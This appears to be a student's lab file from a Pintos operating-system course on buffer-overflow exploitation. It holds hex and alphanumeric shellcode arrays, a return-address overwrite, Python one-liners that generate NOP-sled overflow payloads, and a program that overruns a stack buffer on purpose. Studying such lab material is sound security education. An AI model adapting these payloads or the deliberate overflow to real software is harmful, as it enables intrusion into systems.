// /* klaar@ida

//    pintos -v --fs-disk=2 -p ../examples/crack -a crack -p ../examples/shellcode -a shellcode -- -f -q run 'shellcode'

//    -*- Woahhh, have fun -*-
//    http://www.phrack.org/issues.html?issue=49&id=14#article
//    http://www.phrack.org/issues.html?issue=57&id=15#article

//    Somewhat simpler to achieve in Pintos actually.
//  */

// #include <syscall.h>

// #if 1
//  /* This it the below assembly code in binary form. It runs. To get it,
//   * just compile the code below and use the debugger to dump the code
//   * in the main function. */
// char shellcode[] =
// "\x90\x90\x90\x90\x90\xe9\x0b\x00"
// "\x00\x00\x6a\x02\xcd\x30\x31\xc0"
// "\x50\x40\x50\xcd\x30\xe8\xf0\xff"
// "\xff\xff""crack";
// #else
//  /* And this is rather scary amazing...  This is also the below
//   * assembly code in binary form, but now using ONLY alphanumeric
//   * characters. It works flawless...  Using something like isalpha() on
//   * input does not prevent crackers to exploit buffer overflows.
//   */
// char shellcode[] =
// "LLLLZh7JWUX57JWUHPSPPSRPPaWPVUUF"
// "VDNfhKZfXf5vOfPDRPaAjeY0Lka0Tkah"
// "9bdUY1LkbjIY0Lkg0tkhjUX0Dkk0Tkkj"
// "8Y0Lkm0tkohEJZuX1Dkq1TkqjHY0Lku0"
// "tkuCjqX0Dkzs2bdUjK201jPxP20REZuH"
// "crackq";
// #endif

// int main( void ) {
//   exec( "crack" );
// #if 1
//   int *ret; /* A local variable is stored on the stack. */

//   ret = (int *)&ret + 2;   /* Two steps above in the stack is the
//                             * address to continue at when main
//                             * return... the normal function return
//                             * address. */
//   ( *ret ) = (int)shellcode; /* We overwrite it with the address to the
//                             * shell code. This will check that the
//                             * shell code works as expected. */
//   return 0;
// #else
//   /* Assembler code to do the following:
//    *
//    *  exec("crack");
//    *  exit();
//    *
//    * Apparently the code 0x01 can not be sent as input to pintos, so
//    * it can not be part of any instruction. Reason unknown. Theory:
//    * 0x01 may be grabbed as Ctrl-a by QEMU ?
//    *
//    * Translate push 0x01 ==> ... push %eax
//    *
//    * The tricky part is to figure out at which address the name of the
//    * program to start is stored. The call instruction solves it
//    * nicely. It saves the following address as return address.
//    */
// 
// __asm__( "jmp    0x0f;"             /* jump to CALL */
//   /* actual address of string pushed as return address by CALL */
//   "push   $0x2;"             /* push EXEC syscall number */
//   "int    $0x30;"            /* make syscall */
//   "xor    %eax,%eax;"        /* load 0 in eax */
//   "push   %eax;"             /* push exit_status */
//   "inc    %eax;"             /* inc eax to 1 */
//   "push   %eax;"             /* push EXIT syscall number */
//   "int    $0x30;"            /* make syscall */
//   /* CALL */"call   -0x0C;"            /* jumps back again */
//   ".string \"crack\";"       /* program to start */
// );
// #endif
// }


/* klaar@ida

   pintos -v --fs-disk=2 -p ../examples/crack -a crack -p ../examples/shellcode -a shellcode -- -f -q run 'shellcode'

   -*- Woahhh, have fun -*-
   http://www.phrack.org/issues.html?issue=49&id=14#article
   http://www.phrack.org/issues.html?issue=57&id=15#article

   Somewhat simpler to achieve in Pintos actually.
 */








 // #include <stdio.h>
 // #include <stdlib.h>
 // #include <string.h>
 // #include <syscall.h>

 // #if 1
 //  /* This it the below assembly code in binary form. It runs. To get it,
 //   * just compile the code below and use the debugger to dump the code
 //   * in the main function. */
 // char shellcode[] =
 // "\x90\x90\x90\x90\x90\x90\x90\x90"
 // "\x90\x90\x90\x90\x90\x90\x31\xc0"
 // "\xb0\x01\x31\xdb\xcd\x80\x6e\xff"
 // "\xff\xbf";
 // #else
 //  /* And this is rather scary amazing...  This is also the below
 //   * assembly code in binary form, but now using ONLY alphanumeric
 //   * characters. It works flawless...  Using something like isalpha() on
 //   * input does not prevent crackers to exploit buffer overflows.
 //   */
 // char shellcode[] =
 // "LLLLZh7JWUX57JWUHPSPPSRPPaWPVUUF"
 // "VDNfhKZfXf5vOfPDRPaAjeY0Lka0Tkah"
 // "9bdUY1LkbjIY0Lkg0tkhjUX0Dkk0Tkkj"
 // "8Y0Lkm0tkohEJZuX1Dkq1TkqjHY0Lku0"
 // "tkuCjqX0Dkzs2bdUjK201jPxP20REZuH"
 // "crackq";
 // #endif

 // void getMessage() {
 //   char buffer[10];
 //   memcpy( buffer, shellcode, sizeof( shellcode ) / sizeof( char ) );
 //   printf( "%s", shellcode );
 // }

 // int main( void ) {
 //   if ( 1 ) {
 //     getMessage();
 //     return 0;
 //   }
 //   return 1;
 // }


/* thomas's */
// python -c "print('\x90'*257+'\xE9\x0B\x00\x00\x00\x6A\x02\xCD\x30\x31\xC0\x50\x40\x50\xCD\x30\xE8\xF0\xFF\xFF\xFFcrack\0'+'\x70\xfe\xff\xbf'*25)" > ../userprog/build/shellcode

/* mine exit */
// python -c "print('\x90'*250+'\xB8\x01\x00\x00\x00\xBB\x09\x00\x00\x00\x53\x50\xCD\x30'+'\xff\xfe\xff\xbf'*25)" > ../userprog/build/shellcode

/* MY FING WINNING LINE */
// python -c "print('\x90'*256+'\x6A\x00\x68\x70\x73\x77\x64\x89\xE1\x51\x6A\x05\xCD\x30\x6A\x00\x6A\x01\xCD\x30\x6A\x00\xCD\x30'+'\x70\xfe\xff\xbf'*25)" > ../userprog/build/shellcode



#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <syscall.h>

 /* This it the below assembly code in binary form. It runs. To get it,
  * just compile the code below and use the debugger to dump the code
  * in the main function. */
char shellcode[] =
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x31\xc0"
"\xb0\x01\x31\xdb\xcd\x80\x7e\xff"
"\xff\xbf";

void getMessage( int file ) {
  char buffer[300];
  // printf( "%s\n", buffer );
  // printf( "func: before: buffer address: %p\n", buffer );
  read( file, buffer, 400 );
  // printf( "func: after\n" );
  // printf( "%s\n", buffer );
}

int main( int argc, char *argv[] ) {

  int fd = open( argv[1] );
  // printf( "main: before\n" );
  getMessage( fd );
  // printf( "main: after\n" );

  close( fd );
  return 69;
}

// xorecx, ecx
// push ecx
// push 0x64777370
// push 0x6
// mov ebx, esp
// int 0x30
// mov ebx, eax

// push ebx
// push 0x6f72676e
// push 0x4
// int 0x30

// push ebx
// push 0xc
// int 0x30

// push 0x0
// push 0x1
// int 0x30


// push 0x4
// push   0x6f72676e
// push   0x1
// push   0x9
// int    0x30


// jmp    0x15
// push   0x5
// int    0x30
// xor eax, eax
// push   eax
// inc    eax
// push   eax
// int    0x30
// call   0xa


